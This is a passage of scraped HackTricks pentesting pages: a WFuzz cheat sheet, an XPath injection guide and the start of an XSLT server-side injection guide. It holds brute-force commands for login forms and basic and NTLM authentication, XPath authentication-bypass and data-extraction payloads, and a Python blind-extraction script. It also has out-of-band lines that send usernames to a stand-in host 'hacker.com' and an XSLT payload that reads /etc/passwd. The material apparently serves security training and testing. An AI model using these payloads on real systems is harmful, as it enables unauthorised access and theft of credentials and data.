        "text": "Web Tool - WFuzz\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nA tool to FUZZ web applications anywhere.\nWfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.\nInstallation\nInstalled in Kali\nGithub:\nhttps://github.com/xmendez/wfuzz\n‚Äã\npip install wfuzz\nFiltering options\n--hs/ss\n\"regex\"\n#Hide/Show\n#Simple example, match a string: \"Invalid username\"\n#Regex example: \"Invalid *\"\n‚Äã\n--hc/sc CODE\n#Hide/Show by code in response\n--hl/sl NUM\n#Hide/Show by number of lines in response\n--hw/sw NUM\n#Hide/Show by number of words in response\n--hh/sh NUM\n#Hide/Show by number of chars in response\n--hc/sc NUM\n#Hide/Show by response code\nOutput options\nwfuzz\n-e\nprinters\n#Prints the available output formats\n-f\n/tmp/output,csv\n#Saves the output in that location in csv format\nEncoders options\nwfuzz\n-e\nencoders\n#Prints the available encoders\n#Examples: urlencode, md5, base64, hexlify, uri_hex, doble urlencode\nIn order to use an encoder, you have to indicate it in the\n\"-w\"\nor\n\"-z\"\noption.\nExamples:\n-z\nfile,/path/to/file,md5\n#Will use a list inside the file, and will transform each value into its md5 hash before sending it\n-w\n/path/to/file,base64\n#Will use a list, and transform to base64\n-z\nlist,each-element-here,hexlify\n#Inline list and to hex before sending values\nCheetSheet\nLogin Form bruteforce\nPOST, Single list, filter string (hide)\nwfuzz\n-c\n-w\nusers.txt\n--hs\n\"Login name\"\n-d\n\"name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in\"\nhttp://zipper.htb/zabbix/index.php\n#Here we have filtered by line\nPOST, 2 lists, filter code (show)\nwfuzz.py\n-c\n-z\nfile,users.txt\n-z\nfile,pass.txt\n--sc\n200\n-d\n\"name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in\"\nhttp://zipper.htb/zabbix/index.php\n#Here we have filtered by code\nGET, 2 lists, filter string (show), proxy, cookies\nwfuzz\n-c\n-w\nusers.txt\n-w\npass.txt\n--ss\n\"Welcome \"\n-p\n127.0\n.0.1:8080:HTTP\n-b\n\"PHPSESSIONID=1234567890abcdef;customcookie=hey\"\n\"http://example.com/index.php?username=FUZZ&password=FUZ2Z&action=sign+in\"\nBruteforce Directory/RESTful bruteforce\n‚Äã\nArjun parameters wordlist\n‚Äã\nwfuzz -c -w /tmp/tmp/params.txt --hc 404 https://domain.com/api/FUZZ\nPath Parameters BF\nwfuzz\n-c\n-w\n~/git/Arjun/db/params.txt\n--hw\n11\n'http://example.com/path%3BFUZZ=FUZZ'\nHeader Authentication\nBasic, 2 lists, filter string (show), proxy\nwfuzz\n-c\n-w\nusers.txt\n-w\npass.txt\n-p\n127.0\n.0.1:8080:HTTP\n--ss\n\"Welcome\"\n--basic\nFUZZ:FUZ2Z\n\"http://example.com/index.php\"\nNTLM, 2 lists, filter string (show), proxy\nwfuzz\n-c\n-w\nusers.txt\n-w\npass.txt\n-p\n127.0\n.0.1:8080:HTTP\n--ss\n\"Welcome\"\n--ntlm\n'domain\\FUZZ:FUZ2Z'\n\"http://example.com/index.php\"\nCookie/Header bruteforce (vhost brute)\nCookie, filter code (show), proxy\nwfuzz\n-c\n-w\nusers.txt\n-p\n127.0\n.0.1:8080:HTTP\n--ss\n\"Welcome \"\n-H\n\"Cookie:id=1312321&user=FUZZ\"\n\"http://example.com/index.php\"\nUser-Agent, filter code (hide), proxy\nwfuzz\n-c\n-w\nuser-agents.txt\n-p\n127.0\n.0.1:8080:HTTP\n--ss\n\"Welcome \"\n-H\n\"User-Agent: FUZZ\"\n\"http://example.com/index.php\"\nHost\nwfuzz\n-c\n-w\n/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-\ntop1million-20000.txt\n--hc\n400,404\n,403\n-H\n\"Host: FUZZ.example.com\"\n-u\nhttp://example.com\n-t\n100\nHTTP Verbs (methods) bruteforce\nUsing file\nwfuzz\n-c\n-w\nmethods.txt\n-p\n127.0\n.0.1:8080:HTTP\n--sc\n200\n-X\nFUZZ\n\"http://example.com/index.php\"\nUsing inline list\n$ wfuzz\n-z\nlist,GET-HEAD-POST-TRACE-OPTIONS\n-X\nFUZZ http://testphp.vulnweb.com/\nDirectory & Files Bruteforce\n#Filter by whitelisting codes\nwfuzz\n-c\n-z\nfile,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n--sc\n200,202\n,204,301,302,307,403 http://example.com/uploads/FUZZ\nTool to bypass Webs\n‚Äã\nhttps://github.com/carlospolop/fuzzhttpbypass\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nWebSocket Attacks\nNext\n- Pentesting Web\nXPATH injection\nLast modified\n6mo ago"
    },
    {
        "title": "XPATH injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/xpath-injection",
        "text": "XPATH injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Syntax\nXPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.\nInfo about how to make queries:\nhttps://www.w3schools.com/xml/xpath_syntax.asp\n‚Äã\nNodes\nExpression\nDescription\nnodename\nSelects all nodes with the name \"nodename\"\n/\nSelects from the root node\n//\nSelects nodes in the document from the current node that match the selection no matter where they are\n.\nSelects the current node\n..\nSelects the parent of the current node\n@\nSelects attributes\nExamples:\nPath Expression\nResult\nbookstore\nSelects all nodes with the name \"bookstore\"\n/bookstore\nSelects the root element bookstore\nNote:\nIf the path starts with a slash ( / ) it always represents an absolute path to an element!\nbookstore/book\nSelects all book elements that are children of bookstore\n//book\nSelects all book elements no matter where they are in the document\nbookstore//book\nSelects all book elements that are descendant of the bookstore element, no matter where they are under the bookstore element\n//@lang\nSelects all attributes that are named lang\nPredicates\nPath Expression\nResult\n/bookstore/book[1]\nSelects the first book element that is the child of the bookstore element.\nNote:\nIn IE 5,6,7,8,9 first node is[0], but according to W3C, it is [1]. To solve this problem in IE, set the SelectionLanguage to XPath:\nIn JavaScript: xml.setProperty(\"SelectionLanguage\",\"XPath\");\n/bookstore/book[last()]\nSelects the last book element that is the child of the bookstore element\n/bookstore/book[last()-1]\nSelects the last but one book element that is the child of the bookstore element\n/bookstore/book[position()<3]\nSelects the first two book elements that are children of the bookstore element\n//title[@lang]\nSelects all the title elements that have an attribute named lang\n//title[@lang='en']\nSelects all the title elements that have a \"lang\" attribute with a value of \"en\"\n/bookstore/book[price>35.00]\nSelects all the book elements of the bookstore element that have a price element with a value greater than 35.00\n/bookstore/book[price>35.00]/title\nSelects all the title elements of the book elements of the bookstore element that have a price element with a value greater than 35.00\nUnknown Nodes\nWildcard\nDescription\n*\nMatches any element node\n@*\nMatches any attribute node\nnode()\nMatches any node of any kind\nExamples:\nPath Expression\nResult\n/bookstore/*\nSelects all the child element nodes of the bookstore element\n//*\nSelects all elements in the document\n//title[@*]\nSelects all title elements which have at least one attribute of any kind\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nExample\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<\ndata\n>\n<\nuser\n>\n<\nname\n>\npepe\n</\nname\n>\n<\npassword\n>\npeponcio\n</\npassword\n>\n<\naccount\n>\nadmin\n</\naccount\n>\n</\nuser\n>\n<\nuser\n>\n<\nname\n>\nmark\n</\nname\n>\n<\npassword\n>\nm12345\n</\npassword\n>\n<\naccount\n>\nregular\n</\naccount\n>\n</\nuser\n>\n<\nuser\n>\n<\nname\n>\nfino\n</\nname\n>\n<\npassword\n>\nfino2\n</\npassword\n>\n<\naccount\n>\nregular\n</\naccount\n>\n</\nuser\n>\n</\ndata\n>\nAccess the information\nAll names - [pepe, mark, fino]\nname\n//name\n//name/node()\n//name/child::node()\nuser/name\nuser//name\n/user/name\n//user/name\n‚Äã\nAll values - [pepe, peponcio, admin, mark, ...]\n//user/node()\n//user/child::node()\n‚Äã\n‚Äã\nPositions\n//user[position()=1]/name #pepe\n//user[last()-1]/name #mark\n//user[position()=1]/child::node()[position()=2] #peponcio (password)\n‚Äã\nFunctions\ncount(//user/node()) #3*3 = 9 (count all values)\nstring-length(//user[position()=1]/child::node()[position()=1]) #Length of \"pepe\" = 4\nsubstrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> \"a\"\nIdentify & stealing the schema\nand\ncount\n(\n/*\n)\n=\n1\n#root\nand\ncount\n(\n/*\n[\n1\n]\n/*\n)\n=\n2\n#count(root) = 2 (a,c)\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n)\n=\n1\n#count(a) = 1 (b)\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n)\n=\n0\n#count(b) = 0\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n2\n]\n/*\n)\n=\n3\n#count(c) = 3 (d,e,f)\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n2\n]\n/*\n[\n1\n]\n/*\n)\n=\n0\n#count(d) = 0\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n2\n]\n/*\n[\n2\n]\n/*\n)\n=\n0\n#count(e) = 0\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n2\n]\n/*\n[\n3\n]\n/*\n)\n=\n1\n#count(f) = 1 (g)\nand\ncount\n(\n/*\n[\n1\n]\n/*\n[\n2\n]\n/*\n[\n3\n]\n/\n[\n1\n]\n*\n)\n=\n0\n#count(g) = 0\n‚Äã\n#The previous solutions are the representation of a schema like the following\n#(at this stage we don't know the name of the tags, but jus the schema)\n<\nroot\n>\n<\na\n>\n<\nb\n></\nb\n>\n</\na\n>\n<\nc\n>\n<\nd\n></\nd\n>\n<\ne\n></\ne\n>\n<\nf\n>\n<\nh\n></\nh\n>\n</\nf\n>\n</\nc\n>\n</\nroot\n>\n‚Äã\nand\nname\n(\n/*\n[\n1\n])\n=\n\"root\"\n#Confirm the name of the first tag is \"root\"\nand\nsubstring\n(\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]),\n1\n,\n1\n)\n=\n\"a\"\n#First char of name of tag `<a>` is \"a\"\nand\nstring\n-\nto\n-\ncodepoints\n(\nsubstring\n(\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n),\n1\n,\n1\n))\n=\n105\n#Firts char of tag `<b>`is codepoint 105 (\"i\") (https://codepoints.net/)\n‚Äã\n#Stealing the schema via OOB\ndoc\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]),\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n[\n1\n])))\ndoc\n-\navailable\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]),\nname\n(\n/*\n[\n1\n]\n/*\n[\n1\n]\n/*\n[\n1\n])))\nAuthentication Bypass\nExample of queries:\nstring(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())\n$q = '/usuarios/usuario[cuenta=\"' . $_POST['user'] . '\" and passwd=\"' . $_POST['passwd'] . '\"]';\nOR bypass in user and password (same value in both)\n' or '1'='1\n\" or \"1\"=\"1\n' or ''='\n\" or \"\"=\"\nstring(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())\n‚Äã\nSelect account\nSelect the account using the username and use one of the previous values in the password field\nAbusing null injection\nUsername: ' or 1]%00\nDouble OR in Username or in password\n(is valid with only 1 vulnerable field)\nIMPORTANT: Notice that the\n\"and\" is the first operation made\n.\nBypass with first match\n(This requests are also valid without spaces)\n' or /* or '\n' or \"a\" or '\n' or 1 or '\n' or true() or '\nstring(//user[name/text()='' or true() or '' and password/text()='']/account/text())\n‚Äã\nSelect account\n'or string-length(name(.))<10 or' #Select account with length(name)<10\n'or contains(name,'adm') or' #Select first account having \"adm\" in the name\n'or contains(.,'adm') or' #Select first account having \"adm\" in the current value\n'or position()=2 or' #Select 2¬∫ account\nstring(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())\n‚Äã\nSelect account (name known)\nadmin' or '\nadmin' or '1'='2\nstring(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())\nString extraction\nThe output contains strings and the user can manipulate the values to search:\n/user/username[contains(., '+VALUE+')]\n') or 1=1 or (' #Get all names\n') or 1=1] | //user/password[('')=(' #Get all names and passwords\n') or 2=1] | //user/node()[('')=(' #Get all values\n')] | //./node()[('')=(' #Get all values\n')] | //node()[('')=(' #Get all values\n') or 1=1] | //user/password[('')=(' #Get all names and passwords\n')] | //password%00 #All names and passwords (abusing null injection)\n')]/../*[3][text()!=(' #All the passwords\n')] | //user/*[1] | a[(' #The ID of all users\n')] | //user/*[2] | a[(' #The name of all users\n')] | //user/*[3] | a[(' #The password of all users\n')] | //user/*[4] | a[(' #The account of all users\nBlind Explotation\nGet length of a value and extract it by comparisons:\n' or string-length(//user[position()=1]/child::node()[position()=1])=4 or '\n'\n=\n' #True if length equals 4\n'\nor substring\n((\n//user\n[\nposition\n()\n=\n1\n]\n/child::node\n()[\nposition\n()\n=\n1\n])\n,1,1\n)\n=\n\"a\"\nor\n''\n=\n'\n#True is first equals \"a\"\n‚Äã\nsubstring\n(\n//user\n[\nuserid\n=\n5\n]\n/username,2,1\n)\n=\ncodepoints-to-string\n(\nINT_ORD_CHAR_HERE\n)\n‚Äã\n..\n. and\n(\nif\n(\n$employee\n/role\n=\n2\n)\nthen\nerror\n()\nelse\n0\n)..\n.\n#When error() is executed it rises an error and never returns a value\nPython Example\nimport\nrequests\n,\nstring\n‚Äã\nflag\n=\n\"\"\nl\n=\n0\nalphabet\n=\nstring\n.\nascii_letters\n+\nstring\n.\ndigits\n+\n\"{}_()\"\nfor\ni\nin\nrange\n(\n30\n):\nr\n=\nrequests\n.\nget\n(\n\"http://example.com?action=user&userid=2 and string-length(password)=\"\n+\nstr\n(\ni\n))\nif\n(\n\"TRUE_COND\"\nin\nr\n.\ntext\n):\nl\n=\ni\nbreak\nprint\n(\n\"[+] Password length: \"\n+\nstr\n(\nl\n))\nfor\ni\nin\nrange\n(\n1\n,\nl\n+\n1\n):\n#print(\"[i] Looking for char number \" + str(i))\nfor\nal\nin\nalphabet\n:\nr\n=\nrequests\n.\nget\n(\n\"http://example.com?action=user&userid=2 and substring(password,\"\n+\nstr\n(\ni\n)\n+\n\",1)=\"\n+\nal\n)\nif\n(\n\"TRUE_COND\"\nin\nr\n.\ntext\n):\nflag\n+=\nal\nprint\n(\n\"[+] Flag: \"\n+\nflag\n)\nbreak\nRead file\n(\nsubstring\n((\ndoc\n(\n'file://protected/secret.xml'\n)\n/*\n[\n1\n]\n/*\n[\n1\n]\n/\ntext\n()[\n1\n]),\n3\n,\n1\n)))\n<\n127\nOOB Exploitation\ndoc\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\nRESULTS\n))\ndoc\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\n/\nEmployees\n/\nEmployee\n[\n1\n]\n/\nusername\n))\ndoc\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\nencode\n-\nfor\n-\nuri\n(\n/\nEmployees\n/\nEmployee\n[\n1\n]\n/\nusername\n)))\n‚Äã\n#Instead of doc() you can use the function doc-available\ndoc\n-\navailable\n(\nconcat\n(\n\"http://hacker.com/oob/\"\n,\nRESULTS\n))\n#the doc available will respond true or false depending if the doc exists,\n#user not(doc-available(...)) to invert the result if you need to\nAutomatic tool\nIntroduction - XCat\nReferences\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection\ngithub.com\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nWeb Tool - WFuzz\nNext\n- Pentesting Web\nXSLT Server Side Injection (Extensible Stylesheet Language Transformations)\nLast modified\n4mo ago"
    },
    {
        "title": "XSLT Server Side Injection (Extensible Stylesheet Language Transformations)",
        "url": "https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations",
        "text": "XSLT Server Side Injection (Extensible Stylesheet Language Transformations)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIt is used to transform XML documents in another kind. Versions: 1, 2 and 3 (1 is the most used).\nThe transformation can be done in the server or in the browser).\nThe most used frameworks are:\nLibxslt\n(Gnome),\nXalan\n(Apache) and\nSaxon\n(Saxonica).\nIn order to exploit this kind of vulnerability you need to be able to store xsl tags in the server side and then access that content. An example of this kind of vulnerability can be found on\nhttps://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/\n‚Äã\nExample - Tutorial\nsudo\napt-get\ninstall\ndefault-jdk\nsudo\napt-get\ninstall\nlibsaxonb-java libsaxon-java\nxml.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\ncatalog\n>\n<\ncd\n>\n<\ntitle\n>\nCD Title\n</\ntitle\n>\n<\nartist\n>\nThe artist\n</\nartist\n>\n<\ncompany\n>\nDa Company\n</\ncompany\n>\n<\nprice\n>\n10000\n</\nprice\n>\n<\nyear\n>\n1760\n</\nyear\n>\n</\ncd\n>\n</\ncatalog\n>\nxsl.xsl\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nhtml\n>\n<\nbody\n>\n<\nh2\n>\nThe Super title\n</\nh2\n>\n<\ntable\nborder\n=\n\"\n1\n\"\n>\n<\ntr\nbgcolor\n=\n\"\n#9acd32\n\"\n>\n<\nth\n>\nTitle\n</\nth\n>\n<\nth\n>\nartist\n</\nth\n>\n</\ntr\n>\n<\ntr\n>\n<\ntd\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\ncatalog/cd/title\n\"\n/>\n</\ntd\n>\n<\ntd\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\ncatalog/cd/artist\n\"\n/>\n</\ntd\n>\n</\ntr\n>\n</\ntable\n>\n</\nbody\n>\n</\nhtml\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nExecute:\n$ saxonb-xslt -xsl:xsl.xsl xml.xml\nWarning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:\nRunning an XSLT 1.0 stylesheet with an XSLT 2.0 processor\n<\nhtml\n>\n<\nbody\n>\n<\nh2\n>\nThe Super title\n</\nh2\n>\n<\ntable\nborder\n=\n\"\n1\n\"\n>\n<\ntr\nbgcolor\n=\n\"\n#9acd32\n\"\n>\n<\nth\n>\nTitle\n</\nth\n>\n<\nth\n>\nartist\n</\nth\n>\n</\ntr\n>\n<\ntr\n>\n<\ntd\n>\nCD Title\n</\ntd\n>\n<\ntd\n>\nThe artist\n</\ntd\n>\n</\ntr\n>\n</\ntable\n>\n</\nbody\n>\n</\nhtml\n>\nFingerprint\ndetection.xsl\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\nVersion:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:version')\n\"\n/>\n<\nbr\n/>\nVendor:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:vendor')\n\"\n/>\n<\nbr\n/>\nVendor URL:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:vendor-url')\n\"\n/>\n<\nbr\n/>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:product-name')\n\"\n>\nProduct Name:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:product-name')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:product-version')\n\"\n>\nProduct Version:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:product-version')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:is-schema-aware')\n\"\n>\nIs Schema Aware ?:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:is-schema-aware')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:supports-serialization')\n\"\n>\nSupports Serialization:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:supportsserialization')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:supports-backwards-compatibility')\n\"\n>\nSupports Backwards Compatibility:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:supportsbackwards-compatibility')\n\"\n/>\n<\nbr\n/>\n</\nxsl:\nif\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nAnd execute\n$saxonb-xslt -xsl:detection.xsl xml.xml\n‚Äã\nWarning: at xsl:stylesheet on line 2 column 80 of detection.xsl:\nRunning an XSLT 1.0 stylesheet with an XSLT 2.0 processor\n<\nh2\n>\nXSLT identification\n</\nh2\n>\n<\nb\n>\nVersion:\n</\nb\n>\n2.0\n<\nbr\n>\n<\nb\n>\nVendor:\n</\nb\n>\nSAXON 9.1.0.8 from Saxonica\n<\nbr\n>\n<\nb\n>\nVendor URL:\n</\nb\n>\nhttp://www.saxonica.com/\n<\nbr\n>\nRead Local File\nread.xsl\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nabc\n=\n\"\nhttp://php.net/xsl\n\"\nversion\n=\n\"\n1.0\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nunparsed-text('/etc/passwd', 'utf-8')\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n$ saxonb-xslt -xsl:read.xsl xml.xml\n‚Äã\nWarning: at xsl:stylesheet on line 1 column 111 of read.xsl:\nRunning an XSLT 1.0 stylesheet with an XSLT 2.0 processor\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nSSRF\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\nxmlns:\nabc\n=\n\"\nhttp://php.net/xsl\n\"\nversion\n=\n\"\n1.0\n\"\n>\n<\nxsl:\ninclude\nhref\n=\n\"\nhttp://127.0.0.1:8000/xslt\n\"\n/>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\nVersions\nThere might be more or less functions depending on the XSLT version used:\n‚Äã\nhttps://www.w3.org/TR/xslt-10/\n‚Äã\n‚Äã\nhttps://www.w3.org/TR/xslt20/\n‚Äã\n‚Äã\nhttps://www.w3.org/TR/xslt-30/\n‚Äã\nFingerprint\nUpload this and take information\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<\nxsl:\nstylesheet\nversion\n=\n\"\n1.0\n\"\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\n/\n\"\n>\nVersion:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:version')\n\"\n/>\n<\nbr\n/>\nVendor:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:vendor')\n\"\n/>\n<\nbr\n/>\nVendor URL:\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:vendor-url')\n\"\n/>\n<\nbr\n/>\n<\nxsl:\nif\ntest\n=\n\"\nsystem-property('xsl:product-name')\n\"\n>\nProduct 